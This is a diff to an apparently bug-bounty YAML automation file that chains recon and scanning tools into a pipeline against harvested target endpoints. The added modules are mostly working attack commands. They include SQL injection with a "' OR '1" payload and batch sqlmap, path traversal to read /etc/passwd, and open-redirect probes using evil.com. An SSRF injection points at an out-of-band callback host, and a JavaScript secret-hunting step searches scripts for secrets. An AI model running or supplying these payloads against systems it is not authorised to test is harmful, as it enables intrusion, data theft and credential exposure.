@@ -10,6 +10,7 @@ vars:
   OUTPUT_HTTPX_IP: "aliveIpSubs"
   OUTPUT_NUCLEI: "nuclei"
   OUTPUT_NUCLEI_IP: "nucleiIps"
+  OUTPUT_NUCLEI_SWAGGER: "nucleiSwagger"
   OUTPUT_SUBJACK: "subjackTakeover"
   OUTPUT_SUBZY: "subzyTakeover"
   OUTPUT_WAYBACKURLS: "waybackurls"
@@ -36,6 +37,47 @@ vars:
   OUTPUT_JUST_JS: "justJS"
   OUTPUT_JS_200: "JS200"
   OUTPUT_ALIVE_JUST_JS: "aliveJustJS"
+  OUTPUT_MANTRA: "mantra"
+  OUTPUT_SAIDA_LINKFINDER: "saida"
+  OUTPUT_URLS_LINKFINDER: "jsUrls"
+  OUTPUT_NEW_TARGETS: "newTargets"
+  OUTPUT_NEW_FILTERED_TARGETS: "newFilteredTargets"
+  OUTPUT_DNSX_NEW_TARGETS: "dnsxNew"
+  OUTPUT_NAABU_NEW_TARGETS: "naabuNew"
+  OUTPUT_NAABU_IP_NEW_TARGETS: "ipNaabuNew"
+  OUTPUT_HTTPX_NEW_TARGETS: "aliveSubsNew"
+  OUTPUT_HTTPX_IP_NEW_TARGETS: "aliveIpSubsNew"
+  OUTPUT_NUCLEI_NEW_TARGETS: "nucleiNew"
+  OUTPUT_NUCLEI_NEW_IP_TARGETS: "nucleiIpNew"
+  OUTPUT_NUCLEI_SWAGGER_NEW_TARGETS: "nucleiSwaggerNew"
+  OUTPUT_SUBJACK_NEW_TARGETS: "subjackTakeoverNew"
+  OUTPUT_SUBZY_NEW_TARGETS: "subzyTakeoverNew"
+  OUTPUT_WAYBACKURLS_NEW_TARGETS: "waybackurlsNew"
+  OUTPUT_GAU_NEW_TARGETS: "gauNew"
+  OUTPUT_GAUPLUS_NEW_TARGETS: "gauplusNew"
+  OUTPUT_HAKRAWLER_NEW_TARGETS: "hakrawlerNew"
+  OUTPUT_KATANA_NEW_TARGETS: "katanaNew"
+  OUTPUT_ARJUN1_NEW_TARGETS: "arjun1New"
+  OUTPUT_ARJUN2_NEW_TARGETS: "arjun2New"
+  OUTPUT_PARAMSPIDER_NEW_TARGETS: "paramspiderNew"
+  OUTPUT_ENDPOINTS_CLEAN_NEW_TARGETS: "endpointsCleanNew"
+  OUTPUT_ENDPOINTS_HTTP_NEW_TARGETS: "endpointsHttpNew"
+  OUTPUT_ENDPOINTS_NEW_TARGETS: "endpointsNew"
+  OUTPUT_ALIVE_ENDPOINTS_NEW_TARGETS: "aliveEndpointsNew"
+  OUTPUT_ALL_ALIVE_ENDPOINTS: "allAliveEndpoints"
+  OUTPUT_GXSS: "reflectedParams"
+  OUTPUT_DALFOX: "dalfox"
+  OUTPUT_NUCLEI_FUZZING_TEMPLATES: "fuzzingTemplates"
+  OUTPUT_SQLMAP: "sqlmap"
+  OUTPUT_SQL_SINTAX_ERROR: "sqlSyntaxError"
+  OUTPUT_OPEN_REDIRECT_FUZZ: "openRedirectFuzz"
+  OUTPUT_OPENREDIREX: "openRedireX"
+  OUTPUT_OPEN_REDIRECT_HTTPX: "openRedirectHttpx"
+  OUTPUT_OPEN_REDIRECT_RUSH: "openRedirectRush"
+  OUTPUT_LFI_CURL: "lfiCurl"
+  OUTPUT_LFI_FFUF: "lfiFfuf"
+  OUTPUT_SSRF_HTTPX: "ssrfHttpx"
+  OUTPUT_SSTIMAP: "sstiMap"
   
 parallel: false
 modules:
@@ -60,7 +102,7 @@ modules:
     silent: true
   - name: Nuclei Swagger
     cmds:
-      - cat {{OUTPUT_HTTPX}} | nuclei -tags swagger -t ~/nuclei-templates -o swagger | notify
+      - cat {{OUTPUT_HTTPX}} | nuclei -tags swagger -t ~/nuclei-templates -o {{OUTPUT_NUCLEI_SWAGGER}} | notify
     silent: true
   - name: Subdomain Takeover
     cmds:
@@ -107,5 +149,92 @@ modules:
     silent: true
   - name: JS Analysis
     cmds:
-      -
-      -
+      - cat {{OUTPUT_ALIVE_JUST_JS}} | xargs -I @ bash -c "python3 ~/Tools/linkfinder.py -i @ -o cli" | python3 ~/Tools/collector.py output
+      - rush -i output/urls.txt 'python3 ~/Tools/SecretFinder.py -i {} -o cli | sort -u >> output/resultJSPASS'
+      - cat {{OUTPUT_ALIVE_JUST_JS}} | mantra | tee {{OUTPUT_MANTRA}}
+      - echo 'USE JSSCANER https://github.com/0x240x23elu/JSScanner' | notify
+      - xargs -a {{OUTPUT_ALIVE_JUST_JS}} -n 2 -I@ bash -c "python3 ~/Tools/LinkFinder/linkfinder.py -i @ -o cli" | tee {{OUTPUT_SAIDA_LINKFINDER}}; cat {{OUTPUT_SAIDA_LINKFINDER}} | grep -o 'https\?://[^/]*' | tee {{OUTPUT_URLS_LINKFINDER}}
+      - comm -23 <(sort {{SUBDOMAINS_FILE}}) <(sort {{OUTPUT_URLS_LINKFINDER}}) > {{OUTPUT_NEW_TARGETS}}
+      - cat {{OUTPUT_NEW_TARGETS}} | grep -Ei "COLOCAR|SUBS|USADOS" | tee {{OUTPUT_NEW_FILTERED_TARGETS}}
+    silent: true
+  - name: Resolving New Targets
+    cmds:
+      - cat {{OUTPUT_NEW_FILTERED_TARGETS}} | dnsx -resp-only -a -silent -t {{WORKERS}} | tee {{OUTPUT_DNSX_NEW_TARGETS}}
+      - cat {{OUTPUT_NEW_FILTERED_TARGETS}} | naabu -silent -c {{WORKERS}} -rate {{RATE}} -p - | tee {{OUTPUT_NAABU_NEW_TARGETS}}
+      - cat {{OUTPUT_DNSX_NEW_TARGETS}} | naabu -silent -c {{WORKERS}} -rate {{RATE}} -p - | tee {{OUTPUT_NAABU_IP_NEW_TARGETS}}
+      - cat {{OUTPUT_NAABU_NEW_TARGETS}} | httpx -silent -t {{WORKERS}} -rl {{HTTPX_RATE_LIMIT}} -o {{OUTPUT_HTTPX_NEW_TARGETS}}
+      - cat {{OUTPUT_NAABU_IP_NEW_TARGETS}} | httpx -silent -t {{WORKERS}} -rl {{HTTPX_RATE_LIMIT}} -o {{OUTPUT_HTTPX_IP_NEW_TARGETS}}
+    silent: true
+  - name: Nuclei New Targets
+    cmds:
+      - cat {{OUTPUT_HTTPX_NEW_TARGETS}} | nuclei -etags ssl,netlify -severity low,medium,high,critical -t ~/nuclei-templates/ -o {{OUTPUT_NUCLEI_NEW_TARGETS}} | notify
+      - cat {{OUTPUT_HTTPX_IP_NEW_TARGETS}} | nuclei -etags ssl,netlify -severity low,medium,high,critical -t ~/nuclei-templates/ -o {{OUTPUT_NUCLEI_NEW_IP_TARGETS}} | notify
+    silent: true
+  - name: Nuclei Swagger New Targets
+    cmds:
+      - cat {{OUTPUT_HTTPX_NEW_TARGETS}} | nuclei -tags swagger -t ~/nuclei-templates -o {{OUTPUT_NUCLEI_SWAGGER_NEW_TARGETS}} | notify
+    silent: true
+  - name: Subdomain Takeover New Targets
+    cmds:
+      - subjack -w {{OUTPUT_HTTPX_NEW_TARGETS}} -a -t {{WORKERS}} -o {{OUTPUT_SUBJACK_NEW_TARGETS}}
+      - subzy run --targets {{OUTPUT_HTTPX_NEW_TARGETS}} --concurrency {{WORKERS}} --hide_fails | tee {{OUTPUT_SUBZY_NEW_TARGETS}}
+    silent: true    
+  - name: Endpoints Enumeration New Targets
+    cmds:
+      - cat {{OUTPUT_HTTPX_NEW_TARGETS}} | waybackurls | uro | tee {{OUTPUT_WAYBACKURLS_NEW_TARGETS}}
+      - cat {{OUTPUT_HTTPX_NEW_TARGETS}} | gau --blacklist md,jpg,jpeg,gif,css,tif,tiff,png,ttf,txt,woff,woff2,ico,pdf,php,js | uro | tee {{OUTPUT_GAU_NEW_TARGETS}}
+      - cat {{OUTPUT_HTTPX_NEW_TARGETS}} | gauplus -b md,jpg,jpeg,gif,css,tif,tiff,png,ttf,txt,woff,woff2,ico,pdf,php,js -random-agent | uro | tee {{OUTPUT_GAUPLUS_NEW_TARGETS}}
+      - cat {{OUTPUT_HTTPX_NEW_TARGETS}} | hakrawler | uro | tee {{OUTPUT_HAKRAWLER_NEW_TARGETS}}
+      - katana -list {{OUTPUT_HTTPX_NEW_TARGETS}} -d 15 -silent -f qurl | uro | tee {{OUTPUT_KATANA_NEW_TARGETS}}
+      - arjun -i {{OUTPUT_HTTPX_NEW_TARGETS}} -oT {{OUTPUT_ARJUN1_NEW_TARGETS}}
+      - arjun -i {{OUTPUT_HTTPX_NEW_TARGETS}} -m POST -oT {{OUTPUT_ARJUN2_NEW_TARGETS}}
+      - xargs -a {{OUTPUT_HTTPX_NEW_TARGETS}} -I@ bash -c 'python3 ~/Tools/ParamSpider/paramspider.py -d @ --level high -e md,jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,php,js,txt' | uro | tee {{OUTPUT_PARAMSPIDER_NEW_TARGETS}}
+      - cat {{OUTPUT_WAYBACKURLS_NEW_TARGETS}} {{OUTPUT_GAU_NEW_TARGETS}} {{OUTPUT_GAUPLUS_NEW_TARGETS}} {{OUTPUT_HAKRAWLER_NEW_TARGETS}} {{OUTPUT_KATANA_NEW_TARGETS}} {{OUTPUT_ARJUN1_NEW_TARGETS}} {{OUTPUT_ARJUN2_NEW_TARGETS}} {{OUTPUT_PARAMSPIDER_NEW_TARGETS}} | uro | grep -E '^[^:/?&]+://[^/]+/[^?]+\?[^ ]*=' | tee {{OUTPUT_ENDPOINTS_CLEAN_NEW_TARGETS}}
+      - cat {{OUTPUT_WAYBACKURLS_NEW_TARGETS}} {{OUTPUT_GAU_NEW_TARGETS}} {{OUTPUT_GAUPLUS_NEW_TARGETS}} {{OUTPUT_HAKRAWLER_NEW_TARGETS}} {{OUTPUT_KATANA_NEW_TARGETS}} {{OUTPUT_ARJUN1_NEW_TARGETS}} {{OUTPUT_ARJUN2_NEW_TARGETS}} {{OUTPUT_PARAMSPIDER_NEW_TARGETS}} | uro | grep -E 'https?://[^/]+/[^?]+\?[^ ]*=' | tee {{OUTPUT_ENDPOINTS_HTTP_NEW_TARGETS}}
+      - cat {{OUTPUT_ENDPOINTS_CLEAN_NEW_TARGETS}} {{OUTPUT_ENDPOINTS_HTTP_NEW_TARGETS}} | uro | anew {{OUTPUT_ENDPOINTS_NEW_TARGETS}}
+    silent: true
+  - name: Resolving Endpoints New Targets
+    cmds:
+      - cat {{OUTPUT_ENDPOINTS_NEW_TARGETS}} | httpx -silent -t {{WORKERS}} -rl {{HTTPX_RATE_LIMIT}} | anew {{OUTPUT_ALIVE_ENDPOINTS_NEW_TARGETS}}
+      - rm -rf {{OUTPUT_WAYBACKURLS_NEW_TARGETS}} {{OUTPUT_GAU_NEW_TARGETS}} {{OUTPUT_GAUPLUS_NEW_TARGETS}} {{OUTPUT_HAKRAWLER_NEW_TARGETS}} {{OUTPUT_KATANA_NEW_TARGETS}} {{OUTPUT_ARJUN1_NEW_TARGETS}} {{OUTPUT_ARJUN2_NEW_TARGETS}} {{OUTPUT_PARAMSPIDER_NEW_TARGETS}}
+      - cat {{OUTPUT_ALIVE_ENDPOINTS_NEW_TARGETS}} {{OUTPUT_ALIVE_ENDPOINTS}} | uro | anew {{OUTPUT_ALL_ALIVE_ENDPOINTS}}
+    silent: true  
+  - name: XSS Module - Checking Reflected Parameters
+    cmds:
+      - cat {{OUTPUT_ALL_ALIVE_ENDPOINTS}} | Gxss -c {{WORKERS}} -p Xss -o {{OUTPUT_GXSS}}
+    silent: true
+  - name: XSS Module - Dalfox
+    cmds:
+      - cat {{OUTPUT_ALL_ALIVE_ENDPOINTS}} | dalfox pipe --skip-bav | tee {{OUTPUT_DALFOX}} | notify; echo "Dalfox Finalizado" | notify
+    silent: true
+  - name: XSS Module - Nuclei Fuzzing Templates
+    cmds:
+      - cat {{OUTPUT_ALL_ALIVE_ENDPOINTS}} | nuclei -t ~/fuzzing-templates/xss -o {{OUTPUT_NUCLEI_FUZZING_TEMPLATES}} | notify
+    silent: true
+  - name: SQLI Module
+    cmds:
+      - cat {{OUTPUT_ALL_ALIVE_ENDPOINTS}} | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1 | tee {{OUTPUT_SQLMAP}}
+      - cat {{OUTPUT_ALL_ALIVE_ENDPOINTS}} | gf sqli | grep "=" | qsreplace "' OR '1" | httpx -silent -store-response-dir output -t {{WORKERS}} -rl {{HTTPX_RATE_LIMIT}} | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n" >> {{OUTPUT_SQL_SINTAX_ERROR}}
+      - rm -rf sqli
+    silent: true    
+  - name: Open Redirect Module
+    cmds:
+      - cat {{OUTPUT_ALL_ALIVE_ENDPOINTS}} | gf redirect | grep "=" | qsreplace FUZZ | tee {{OUTPUT_OPEN_REDIRECT_FUZZ}}; python3 ~/Tools/OpenRedireX/ openredirex.py -l {{OUTPUT_OPEN_REDIRECT_FUZZ}} -p ~/Wordlists/payloadsOpenRedirect.txt --keyword FUZZ | tee {{OUTPUT_OPENREDIREX}}
+      - cat {{OUTPUT_ALL_ALIVE_ENDPOINTS}} | gf redirect | httpx -silent -path "//evil.com/..;/css" -mc 302 -status-code -match-string "Location: //evil.com/..;/css" | tee {{OUTPUT_OPEN_REDIRECT_HTTPX}}
+      - cat {{OUTPUT_ALL_ALIVE_ENDPOINTS}} | gf redirect | rush -j40 'if curl -Iks -m 10 "{}/https://redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "{}/redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "{}////;@redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "{}/////redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "{} It seems an Open Redirect Found"; fi' | tee {{OUTPUT_OPEN_REDIRECT_RUSH}}
+    silent: true
+  - name: LFI Module
+    cmds:
+      - cat {{OUTPUT_ALL_ALIVE_ENDPOINTS}} | gf lfi | qsreplace ".%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"' | tee {{OUTPUT_LFI_CURL}}
+      - ffuf -c -w {{OUTPUT_ALL_ALIVE_ENDPOINTS}} -u FUZZ////////../../../../../etc/passwd -mr "root:x" | tee {{OUTPUT_LFI_FFUF}}
+    silent: true
+  - name: SSRF Module
+    cmds:
+      - cat {{OUTPUT_ALL_ALIVE_ENDPOINTS}} | gf ssrf | grep "=" | qsreplace FUZZ | tee ssrfEndpoints; cat ssrfEndpoints | grep FUZZ | qsreplace http://cg9qkyf2vtc0000b9vqgger54ycyyyyyb.oast.fun | httpx -silent | tee {{OUTPUT_SSRF_HTTPX}}
+      - rm -rf ssrfEndpoints
+    silent: true
+  - name: SSTI Module
+    cmds:
+      - cat {{OUTPUT_ALL_ALIVE_ENDPOINTS}} | gf lfi | tee sstiEndpoints; xargs -a sstiEndpoints -I@ bash -c 'python3 ~/Tools/SSTImap/sstimap.py -u @' | tee {{OUTPUT_SSTIMAP}}
+      - rm -rf sstiEndpoints
+    silent: true
